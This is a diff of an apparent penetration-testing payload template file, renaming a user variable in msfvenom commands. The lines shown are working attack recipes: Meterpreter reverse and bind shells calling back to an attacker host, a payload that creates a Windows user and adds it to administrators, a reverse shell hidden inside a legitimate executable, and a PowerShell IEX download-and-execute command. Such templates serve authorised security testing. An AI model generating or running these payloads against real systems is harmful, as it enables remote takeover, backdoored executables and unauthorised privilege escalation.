@@ -18,7 +18,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f exe
 msfvenom -p windows/meterpreter/bind_tcp RHOST=#{LHOST} LPORT=#{LPORT} -f exe > bind.exe
 
 # desc: Windows Create User
-msfvenom -p windows/adduser USER=#{user} PASS=#{user}@#{pwd} -f exe > adduser.exe
+msfvenom -p windows/adduser USER=#{USER} PASS=#{USER}@#{pwd} -f exe > adduser.exe
 
 # desc: Windows CMD Shell
 msfvenom -p windows/shell/reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f exe > prompt.exe
@@ -28,7 +28,7 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Obj
 @download_file_path.desc(下载文件路径)
 
 # desc: Windows Execute Command Add Group
-msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators #{user} /add" -f exe > pay.exe
+msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators #{USER} /add" -f exe > pay.exe
 
 # desc: Windows Embedded inside executable
 msfvenom -p windows/shell_reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -x #{origin_exe} -f exe -o plinkmeter.exe
